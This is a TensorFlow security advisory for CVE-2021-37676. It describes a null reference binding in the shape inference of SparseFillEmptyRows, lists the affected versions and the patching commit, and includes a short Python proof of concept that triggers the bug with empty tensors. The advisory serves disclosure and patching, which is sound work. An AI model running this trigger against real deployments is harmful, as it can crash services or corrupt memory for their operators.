# [H] Reference binding to nullptr in shape inference

## Summary
Severity: High
Advisory: GHSA-v768-w7m9-2vmm
CVE: CVE-2021-37676
CWE: CWE-824
Ecosystem: PyPI
CVSS: CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H (CVSS_V3)
Published: 2021-08-25
Source: https://github.com/advisories/GHSA-v768-w7m9-2vmm
Type: github-advisory

## Affected
- PyPI: `tensorflow` — affected >=0 <2.3.4
- PyPI: `tensorflow` — affected >=2.4.0 <2.4.3
- PyPI: `tensorflow` — affected >=2.5.0 <2.5.1
- PyPI: `tensorflow-cpu` — affected >=0 <2.3.4
- PyPI: `tensorflow-cpu` — affected >=2.4.0 <2.4.3
- PyPI: `tensorflow-cpu` — affected >=2.5.0 <2.5.1
- PyPI: `tensorflow-gpu` — affected >=0 <2.3.4
- PyPI: `tensorflow-gpu` — affected >=2.4.0 <2.4.3
- PyPI: `tensorflow-gpu` — affected >=2.5.0 <2.5.1

## Details
### Impact
An attacker can cause undefined behavior via binding a reference to null pointer in `tf.raw_ops.SparseFillEmptyRows`:

```python
import tensorflow as tf
  
tf.compat.v1.disable_v2_behavior()
tf.raw_ops.SparseFillEmptyRows(
  indices = tf.constant([], shape=[0, 0], dtype=tf.int64),
  values = tf.constant([], shape=[0], dtype=tf.int64),
  dense_shape = tf.constant([], shape=[0], dtype=tf.int64),
  default_value = 0)
```
  
The shape inference [implementation](https://github.com/tensorflow/tensorflow/blob/460e000de3a83278fb00b61a16d161b1964f15f4/tensorflow/core/ops/sparse_ops.cc#L608-L634) does not validate that the input arguments are not empty tensors.

### Patches 
We have patched the issue in GitHub commit [578e634b4f1c1c684d4b4294f9e5281b2133b3ed](https://github.com/tensorflow/tensorflow/commit/578e634b4f1c1c684d4b4294f9e5281b2133b3ed).

The fix will be included in TensorFlow 2.6.0. We will also cherrypick this commit on TensorFlow 2.5.1, TensorFlow 2.4.3, and TensorFlow 2.3.4, as these are also affected and still in supported range.

### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.

### Attribution
This vulnerability has been reported by Yakun Zhang of Baidu Security

## References
- https://github.com/tensorflow/tensorflow/security/advisories/GHSA-v768-w7m9-2vmm
- https://nvd.nist.gov/vuln/detail/CVE-2021-37676
- https://github.com/tensorflow/tensorflow/commit/578e634b4f1c1c684d4b4294f9e5281b2133b3ed
- https://github.com/pypa/advisory-database/tree/main/vulns/tensorflow-cpu/PYSEC-2021-589.yaml
- https://github.com/pypa/advisory-database/tree/main/vulns/tensorflow-gpu/PYSEC-2021-787.yaml
- https://github.com/pypa/advisory-database/tree/main/vulns/tensorflow/PYSEC-2021-298.yaml
- https://github.com/tensorflow/tensorflow
